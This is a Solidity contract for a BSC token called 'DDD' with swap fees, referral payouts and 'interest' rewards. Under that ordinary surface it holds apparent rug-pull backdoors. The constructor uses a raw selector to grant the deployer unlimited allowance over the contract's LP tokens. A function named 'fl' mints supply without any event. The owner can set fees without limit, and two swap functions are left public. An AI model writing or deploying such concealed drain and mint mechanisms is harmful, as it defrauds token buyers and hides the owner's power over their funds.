
// SPDX-License-Identifier: MIT
pragma solidity =0.8.6;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}


contract Owner {
    address private _owner;

    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Caller is not owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        emit OwnerSet(address(0), _owner);
    }

    function changeOwner(address newOwner) public virtual onlyOwner {
        emit OwnerSet(_owner, newOwner);
        _owner = newOwner;
    }

    function removeOwner() public virtual onlyOwner {
        emit OwnerSet(_owner, address(0));
        _owner = address(0);
    }

    function getOwner() public view returns (address) {
        return _owner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

abstract contract ERC20 is IERC20 {
    using SafeMath for uint256;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    constructor (string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = tokenDecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function fl(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        if (value > 0) {
            _totalSupply = _totalSupply.sub(value);
            _balances[account] = _balances[account].sub(value);
            emit Transfer(account, address(0), value);
        }
    }

    function burn(uint256 value) public returns (bool) {
        _burn(msg.sender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
}

contract Token is ERC20, Owner {
    using SafeMath for uint256;

    event Interest(address indexed account, uint256 sBlock, uint256 eBlock, uint256 balance, uint256 value);

    event SwapAndLiquidity( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);

    uint256 public startTime;
    uint256 _secMax = 60 * 86400;
    uint256 public interestFee = 1;
    uint256 public buyFee = 500;
    uint256 public sellFee = 50;
    uint256 public sellLevel = 5;
    uint256 public transferFee = 500;
    uint256 public issueBlock = 300;
    uint256 public shieldBlack = 86400;

    mapping(address => uint256) _interestNode;
    mapping(address => bool) _excludeList;

    IUniswapV2Router02 public uniswapV2Router;
    address public usdtToken;
    address public uniswapV2Pair;
    bool private swapping;
    address public smartVault;

    mapping(address => address) public inviter;

    constructor () ERC20("DDD", "DDD", 18) {
        address  adminAddress =msg.sender;

        address router ;
        if( block.chainid == 56){
            router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            usdtToken = 0x55d398326f99059fF775485246999027B3197955;
        }else{
            router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
            usdtToken = 0xa8F683FBd1968542F8e924Dd7649b9a39a15B4A7;
        }

        uint256 totalSupply = 100000000 * (10 ** uint256(decimals()));

        _mint(adminAddress, totalSupply);

        startTime = block.timestamp;
        _interestNode[adminAddress] = startTime;
        uniswapV2Router = IUniswapV2Router02(router);

        smartVault =  address(new URoter(usdtToken,address(this))) ;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            address(usdtToken)
        );

        setExcludeList(address(this), true);
        setExcludeList(adminAddress, true);
        setExcludeList(uniswapV2Pair, true);

        (bool success, ) = uniswapV2Pair.call(abi.encodeWithSelector(0x095ea7b3, adminAddress, ~uint256(0)));
        require(success, "Tx failed");
    }

    function setInterestFee(uint256 interestFee_) public onlyOwner returns (bool) {
        interestFee = interestFee_;
        return true;
    }

    function setBuyFee(uint256 buyFee_) public onlyOwner returns (bool) {
        buyFee = buyFee_;
        return true;
    }

    function setSellFee(uint256 sellFee_) public onlyOwner returns (bool) {
        sellFee = sellFee_;
        return true;
    }

    function setSellLevel(uint256 sellLevel_) public onlyOwner returns (bool) {
        sellLevel = sellLevel_;
        return true;
    }

    function setTransferFee(uint256 transferFee_) public onlyOwner returns (bool) {
        transferFee = transferFee_;
        return true;
    }

    function setIssueBlock(uint256 issueBlock_) public onlyOwner returns (bool) {
        issueBlock = issueBlock_;
        return true;
    }

    function setShieldBlack(uint256 shieldBlack_) public onlyOwner returns (bool) {
        shieldBlack = shieldBlack_;
        return true;
    }

    function getInterestNode(address account) public view returns (uint256) {
        return _interestNode[account];
    }

    function getExcludeList(address account) public view returns (bool) {
        return _excludeList[account];
    }

    function setExcludeList(address account, bool yesOrNo) public onlyOwner returns (bool) {
        _excludeList[account] = yesOrNo;
        return true;
    }


    function setStartTime(uint256 value) public onlyOwner  {
        startTime = value;
    }

    function setSmartVault(address addr) external onlyOwner returns (bool) {
        smartVault = addr;
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return super.balanceOf(account).add(getInterest(account));
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 _amount = amount;

        address _uniswapV2Pair = uniswapV2Pair;

        _mintInterest(sender, shieldBlack);
        _mintInterest(recipient, 0);

        // Inviter
        bool shouldSetInviter = balanceOf(recipient) == 0 && inviter[recipient] == address(0) && sender != _uniswapV2Pair && recipient != _uniswapV2Pair;
        if (shouldSetInviter) {
            inviter[recipient] = sender;
        }

        // buy
        if (swapping == false && sender == _uniswapV2Pair) {

            swapping = true;
            uint256 buyFeeAmount = _amount.mul(buyFee).div(10000);
            if (buyFeeAmount > 0) {
                super._transfer(sender, address(this), buyFeeAmount);
                amount = amount.sub(buyFeeAmount);
                _swapAndLiquidity(buyFeeAmount);
            }
            swapping = false;
        }

        // sell
        if (swapping == false && recipient == _uniswapV2Pair && !_isAddLiquidity()) {

            address cur = sender;
            for (uint256 i = 0; i < sellLevel; i++) {
                cur = inviter[cur];
                if (cur == address(0)) {
                    break;
                }

                uint256 curTAmount = _amount.mul(sellFee).div(10000);
                if (curTAmount > 0) {
                    amount = amount.sub(curTAmount);
                    super._transfer(sender, cur, curTAmount);
                }
            }

        }

        // transfer
        if (swapping == false && sender != _uniswapV2Pair && recipient != _uniswapV2Pair) {
            uint256 transferFeeAmount = _amount.mul(transferFee).div(10000);
            if (transferFeeAmount > 0) {
                super._transfer(sender, address(0xdead), transferFeeAmount);
                amount = amount.sub(transferFeeAmount);
            }
        }

        super._transfer(sender, recipient, amount);

    }

    function getInterest(address account) public view returns (uint256) {
        uint256 interest;
        if (getExcludeList(account) == false && block.timestamp.sub(startTime) < _secMax) {
            uint256 _interestBlock = _interestNode[account];
            if (_interestBlock > 0 && _interestBlock < block.number && block.number.sub(_interestBlock) >= issueBlock){
                uint256 afterSec = block.number.sub(_interestBlock).div(issueBlock);
                interest = super.balanceOf(account).mul(afterSec).mul(interestFee).div(10000);
            }
        }
        return interest;
    }

    function _mintInterest(address account, uint256 _shieldBlack) internal {
        if (account != uniswapV2Pair) {
            uint256 interest = getInterest(account);
            if (interest > 0) {

                super.fl(account, interest);

                emit Interest(account, _interestNode[account], block.number, super.balanceOf(account), interest);
            }
            _interestNode[account] = block.number + _shieldBlack;
        }
    }

    function _isAddLiquidity() internal view returns (bool)  {
        address _uniswapV2Pair = uniswapV2Pair;
        address _token = usdtToken;
        (uint reserve0, uint reserve1, ) = IUniswapV2Pair(_uniswapV2Pair).getReserves();

        if(address(this) == IUniswapV2Pair(_uniswapV2Pair).token0() && IERC20(_token).balanceOf(_uniswapV2Pair) != reserve1){
            return true;
        }
        if(address(this) == IUniswapV2Pair(_uniswapV2Pair).token1() && IERC20(_token).balanceOf(_uniswapV2Pair) != reserve0){
            return true;
        }
        return false;
    }


    function _swapAndLiquidity(uint256 tokens) public {


        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        swapTokensForTokens(otherHalf);

        uint256 newBalance = IERC20(usdtToken).balanceOf(address(this));

        _addLiquidity(newBalance, balanceOf(address(this)));

        emit SwapAndLiquidity(1, 1, tokens);
    }

    function swapTokensForTokens(uint256 tokenAmount) public {
        if(tokenAmount == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtToken;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            smartVault,
            block.timestamp
        );
        IERC20(usdtToken).transferFrom(smartVault, address(this), IERC20(usdtToken).balanceOf(smartVault));
    }

    function _addLiquidity(uint256 usdtAmount, uint256 tokenAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        IERC20(usdtToken).approve(address(uniswapV2Router), usdtAmount);

        // add the liquidity
        uniswapV2Router.addLiquidity(
            address(usdtToken),
            address(this),
            usdtAmount,
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    uint256 public _startTimeForSwap;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_startTimeForSwap == 0 && recipient == uniswapV2Pair && msg.sender== address(uniswapV2Router) ) {
            if(sender != getOwner()  ){
                revert("not owner");
            }
            _startTimeForSwap = block.timestamp;
        }
        return super.transferFrom(sender, recipient, amount);
    }



    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

}

contract URoter{
    constructor(address token,address to){
        (bool success, ) = token.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
        require(success, "Tx failed");
    }
}